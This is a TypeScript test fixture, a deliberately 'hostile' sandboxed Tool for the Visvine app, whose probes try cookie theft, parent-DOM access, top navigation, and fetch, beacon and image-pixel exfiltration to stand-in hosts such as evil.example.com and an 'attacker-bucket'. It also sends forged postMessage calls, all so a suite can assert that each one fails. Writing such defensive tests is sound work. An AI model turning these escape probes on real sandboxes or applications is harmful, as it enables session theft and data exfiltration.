// The interface half of the `hostile` fixture Tool — a Tool written the way an
// attacker would write one.
//
// On mount it runs every escape it can reach from inside the sandbox, one after
// another, and writes the outcomes to `visvine.state.set('probe', …)`, which is
// the one capability it is MEANT to have. scripts/verify-tools-escape.ts reads
// that key back through the bridge and asserts every single one failed.
//
// Two rules this file must keep, or the suite measures the wrong thing:
//
//   1. Nothing may throw or reject uncaught. The frame runtime turns an uncaught
//      error or an unhandled rejection into a `visvine:error`, and the host
//      answers that by REPLACING the iframe with an error card — so a sloppy
//      probe would take the frame away before the suite could read anything.
//      Every probe is wrapped and every wait is bounded.
//   2. Every probe records what happened rather than asserting it. The
//      assertions live in the verify script, where a failure can be reported
//      with a screenshot; a Tool that judged itself could always lie.
import { useEffect, useRef, useState } from 'react'
import { Banner, Card, PageHeader, Stack, Table, useVisvine } from '@visvine/tool-kit'

/** Where the suite reads the confession from. */
const PROBE_KEY = 'probe'

/** In the compiled bundle, so the suite can prove which code it is watching. */
const MARKER = 'verify-tools-escape:hostile'

/** Outside this Tool's declared `read: ["hostile/**"]`. The forged call asks for it. */
const UNDECLARED_NOTE = 'people/index.md'

/** A host the frame is not allowed to reach by any means. */
const EVIL_ORIGIN = 'https://example.com'

/**
 * A public bucket on the storage host the media bucket lives on — anyone can
 * own one. `img-src` must name the app's media path, never the whole host.
 */
const FOREIGN_BUCKET = 'https://storage.googleapis.com/attacker-bucket'

/**
 * The note the suite writes when it wants this Tool to try its last escape:
 * navigating its own frame, with data in the URL. Inside the declared
 * `hostile/**`, so the Tool can watch for it.
 */
const LEAVE_NOTE = 'hostile/leave.md'

/** The id on the forged `visvine:call`, so its result can be told from a real one. */
const FORGED_ID = 'forged-visvine-call'

/**
 * The app origin, declared on `window` by the frame document
 * (lib/tools/frameDocument.ts). The sandbox gives the frame an opaque origin, so
 * this is the only way it can know who its host is — which is exactly why a
 * forged postMessage is worth trying.
 */
const APP_ORIGIN: string =
  (window as unknown as Record<string, unknown>).__VISVINE_PARENT_ORIGIN as string

type Probe = Record<string, unknown>

function describe(e: unknown): string {
  if (e instanceof Error) return `${e.name}: ${e.message}`
  return String(e)
}

/** Run `fn`, recording either its value or the throw. Never propagates. */
function attempt(fn: () => unknown): Probe {
  try {
    return { threw: false, value: fn() }
  } catch (e) {
    return { threw: true, error: describe(e) }
  }
}

/** A promise that resolves to `fallback` if `work` has not settled in `ms`. */
function within<T>(work: Promise<T>, ms: number, fallback: T): Promise<T> {
  return Promise.race([
    work,
    new Promise<T>((resolve) => {
      setTimeout(() => resolve(fallback), ms)
    }),
  ])
}

// ── the probes ────────────────────────────────────────────────────────────────

/** The viewer's session cookie, if the sandbox ever let this document have one. */
function probeCookie(): Probe {
  const read = attempt(() => document.cookie)
  return { ...read, empty: read.value === '' || read.value === undefined }
}

/** The host page's DOM — every note on screen, if it were reachable. */
function probeParentDocument(): Probe {
  return attempt(() => {
    const doc = window.parent.document
    return { title: doc.title, html: doc.documentElement.outerHTML.length }
  })
}

/** Move the whole app somewhere else out from under the viewer. */
function probeTopNavigation(): Probe {
  const assigned = attempt(() => {
    window.top!.location.href = `${EVIL_ORIGIN}/stolen`
    return 'assigned'
  })
  const replaced = attempt(() => {
    ;(window.top as unknown as { location: string }).location = `${EVIL_ORIGIN}/stolen`
    return 'assigned'
  })
  return { assigned, replaced }
}

/** A popup — a window with a real origin, outside the sandbox. */
function probeWindowOpen(): Probe {
  return attempt(() => {
    const opened = window.open(`${EVIL_ORIGIN}/popup`, '_blank')
    if (opened) opened.close()
    return { opened: opened !== null }
  })
}

/** `localStorage`, which an opaque origin does not have. */
function probeLocalStorage(): Probe {
  return attempt(() => {
    window.localStorage.setItem('vv-hostile', '1')
    return { read: window.localStorage.getItem('vv-hostile') }
  })
}

/**
 * A beacon: the one send that survives a page unload, if CSP allowed it.
 *
 * The boolean it hands back is NOT the answer. Chrome returns `true` for a
 * beacon it merely queued, and enforces `connect-src` afterwards — so the honest
 * evidence is the CSP violation the document reports, which is why every probe
 * runs with `securitypolicyviolation` already being recorded.
 */
function probeBeacon(): Probe {
  return attempt(() => navigator.sendBeacon(`${EVIL_ORIGIN}/beacon`, 'stolen'))
}

/** An anchor that breaks out of the frame when clicked. */
function probeTopAnchor(): Probe {
  return attempt(() => {
    const a = document.createElement('a')
    a.href = `${EVIL_ORIGIN}/anchor`
    a.target = '_top'
    a.rel = 'noopener'
    a.textContent = 'x'
    document.body.appendChild(a)
    a.click()
    a.remove()
    return 'clicked'
  })
}

/** The app's own session endpoint, with the viewer's cookie asked for by name. */
async function probeSessionFetch(): Promise<Probe> {
  try {
    const res = await fetch(`${APP_ORIGIN}/api/auth/session`, { credentials: 'include' })
    return { blocked: false, status: res.status, body: (await res.text()).slice(0, 200) }
  } catch (e) {
    return { blocked: true, error: describe(e) }
  }
}

/** Anywhere else at all. `connect-src 'none'` is the exfiltration control. */
async function probeCrossOriginFetch(): Promise<Probe> {
  try {
    const res = await fetch(`${EVIL_ORIGIN}/collect?q=stolen`, { mode: 'no-cors' })
    return { blocked: false, type: res.type, status: res.status }
  } catch (e) {
    return { blocked: true, error: describe(e) }
  }
}

/**
 * An image URL — the classic way out of a `connect-src` lockdown, since an
 * `<img>` is not a connection. `img-src` names the media bucket and nothing
 * else, so the load must fail; the element is deliberately never appended, so
 * its error event cannot reach the frame runtime's `window` handler.
 */
function probeImage(src: string = `${EVIL_ORIGIN}/pixel.png?q=stolen`): Promise<Probe> {
  return within(
    new Promise<Probe>((resolve) => {
      try {
        const img = new Image()
        img.onload = () => resolve({ outcome: 'loaded' })
        img.onerror = () => resolve({ outcome: 'error' })
        img.src = src
      } catch (e) {
        resolve({ outcome: 'threw', error: describe(e) })
      }
    }),
    4_000,
    { outcome: 'never-loaded' },
  )
}

/**
 * A `visvine:call` posted straight at the host, naming a note this Tool never
 * declared. The message is well-formed on purpose: the host relays it, and the
 * SERVER is what refuses — which is the whole design. A frame cannot name its
 * own target, so the worst this can do is ask for something outside the
 * perimeter and be told `perimeter`.
 */
function probeForgedCall(): Promise<Probe> {
  return within(
    new Promise<Probe>((resolve) => {
      const onMessage = (event: MessageEvent) => {
        if (event.origin !== APP_ORIGIN) return
        const data = event.data as { type?: string; id?: string; ok?: boolean; error?: { code?: string; message?: string } }
        if (data?.type !== 'visvine:result' || data.id !== FORGED_ID) return
        window.removeEventListener('message', onMessage)
        resolve({
          answered: true,
          ok: data.ok === true,
          code: data.error?.code ?? null,
          message: data.error?.message ?? null,
        })
      }
      window.addEventListener('message', onMessage)
      window.parent.postMessage(
        { type: 'visvine:call', id: FORGED_ID, method: 'context.read', params: { path: UNDECLARED_NOTE } },
        APP_ORIGIN,
      )
    }),
    8_000,
    { answered: false, ok: false, code: null, message: null },
  )
}

/**
 * A `visvine:navigate` the host must ignore. `//evil` is protocol-relative — it
 * looks like a path and resolves to another site — and the rest are the other
 * shapes that leave the app.
 *
 * Every path here goes OFF the app on purpose. An in-app path (`/admin`, or a
 * `..` chain that still resolves same-origin) is a capability the SDK documents
 * — `visvine.navigate` exists so a Tool can move the app around inside itself —
 * so asking for one and getting it would prove nothing about the sandbox.
 */
function probeForgedNavigate(): Probe {
  const paths = [
    '//evil.example.com/steal',
    'https://evil.example.com/steal',
    'javascript:alert(1)',
    '/\\evil.example.com/steal',
  ]
  return attempt(() => {
    for (const path of paths) {
      window.parent.postMessage({ type: 'visvine:navigate', path }, APP_ORIGIN)
    }
    return { posted: paths }
  })
}

// ── the component ─────────────────────────────────────────────────────────────

export default function Hostile() {
  const visvine = useVisvine()
  const started = useRef(false)
  const [probe, setProbe] = useState<Probe | null>(null)
  const [reported, setReported] = useState<string | null>(null)

  useEffect(() => {
    if (started.current) return
    started.current = true

    // The browser's own account of what it refused to load or send, recorded
    // before anything is tried. Several blocks are invisible from JS — a beacon
    // Chrome queued and then refused reports success to the caller — so this is
    // the only honest signal for them.
    const cspViolations: Array<{ blockedURI: string; directive: string }> = []
    document.addEventListener('securitypolicyviolation', (event) => {
      cspViolations.push({
        blockedURI: event.blockedURI,
        directive: event.effectiveDirective || event.violatedDirective,
      })
    })

    void (async () => {
      const results: Probe = { marker: MARKER, appOrigin: APP_ORIGIN }
      try {
        results.frameOrigin = attempt(() => window.location.origin)
        results.cookie = probeCookie()
        results.parentDocument = probeParentDocument()
        results.topNavigation = probeTopNavigation()
        results.windowOpen = probeWindowOpen()
        results.localStorage = probeLocalStorage()
        results.beacon = probeBeacon()
        results.topAnchor = probeTopAnchor()
        results.forgedNavigate = probeForgedNavigate()
        results.sessionFetch = await probeSessionFetch()
        results.crossOriginFetch = await probeCrossOriginFetch()
        results.image = await probeImage()
        results.bucketImage = await probeImage(`${FOREIGN_BUCKET}/pixel.png?q=stolen`)
        results.forgedCall = await probeForgedCall()

        // The undeclared read, asked for politely through the SDK this time —
        // the same refusal the forged postMessage above should have got.
        try {
          await visvine.context.read(UNDECLARED_NOTE)
          results.declaredRead = { refused: false }
        } catch (e) {
          results.declaredRead = { refused: true, error: describe(e) }
        }

        // And the isolate half: what `data.js` can reach server-side.
        try {
          results.dataCall = { ok: true, value: await visvine.data.call('probe') }
        } catch (e) {
          results.dataCall = { ok: false, error: describe(e) }
        }
      } catch (e) {
        results.suiteError = describe(e)
      }

      results.cspViolations = cspViolations
      setProbe(results)
      try {
        await visvine.state.set(PROBE_KEY, results)
        setReported('reported')
      } catch (e) {
        setReported(describe(e))
      }

      // The last escape, on the suite's word: navigate this frame away with
      // data in the URL — the one channel CSP cannot close. The host must take
      // the frame down and record it.
      for (;;) {
        await new Promise((resolve) => setTimeout(resolve, 1_000))
        try {
          await visvine.context.read(LEAVE_NOTE)
        } catch {
          continue
        }
        window.location.href = `${window.location.origin}/api/tools/runtime/frame?left=${encodeURIComponent(MARKER)}`
        return
      }
    })()
  }, [visvine])

  const rows: Array<{ name: string; outcome: unknown }> = Object.entries(probe ?? {}).map(
    ([name, outcome]) => ({ name, outcome }),
  )

  return (
    <Stack gap="md">
      <PageHeader
        title="Hostile"
        description="A fixture Tool that tries to escape its sandbox. Everything below must fail."
      />

      <Banner tone={reported === 'reported' ? 'info' : 'warn'} title="Probe">
        {reported === null
          ? 'Running…'
          : reported === 'reported'
            ? `Reported as state key "${PROBE_KEY}" — ${MARKER}`
            : reported}
      </Banner>

      <Card title="What it tried">
        <Table
          columns={[
            { key: 'name', header: 'Escape', render: (row) => row.name },
            { key: 'outcome', header: 'Outcome', render: (row) => JSON.stringify(row.outcome).slice(0, 300) },
          ]}
          rows={rows}
          rowKey={(row) => row.name}
        />
      </Card>
    </Stack>
  )
}
